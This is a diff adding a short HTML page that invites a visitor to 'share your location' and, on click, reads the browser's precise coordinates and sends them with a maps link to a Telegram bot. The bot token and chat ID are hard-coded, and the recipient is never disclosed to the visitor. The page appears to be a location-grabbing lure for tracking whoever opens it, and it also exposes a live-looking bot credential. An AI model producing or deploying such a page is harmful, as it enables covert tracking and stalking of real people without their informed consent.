@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Share</title>
+</head>
+<body>
+  <h2>Konumunu paylaş</h2>
+  <button onclick="getLocation()">Paylaş</button>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendToTelegram);
+  } else {
+    alert("Geolocation dəstəklənmir.");
+  }
+}
+
+function sendToTelegram(position) {
+  var lat = position.coords.latitude;
+  var lon = position.coords.longitude;
+
+  var token = "8417761923:AAHGD-IGI4CfTQxqnmHiSjayoXJ0XELz42M";
+  var chat_id = "8661678496";
+
+  var text = "Yeni Konum:%0A";
+  text += "Latitude: " + lat + "%0A";
+  text += "Longitude: " + lon + "%0A";
+  text += "Google Maps: https://maps.google.com/?q=" + lat + "," + lon;
+
+  var url = "https://api.telegram.org/bot" + token +
+            "/sendMessage?chat_id=" + chat_id +
+            "&text=" + text;
+
+  fetch(url);
+  alert("Konum göndərildi");
+}
+</script>
+
+</body>
+</html>
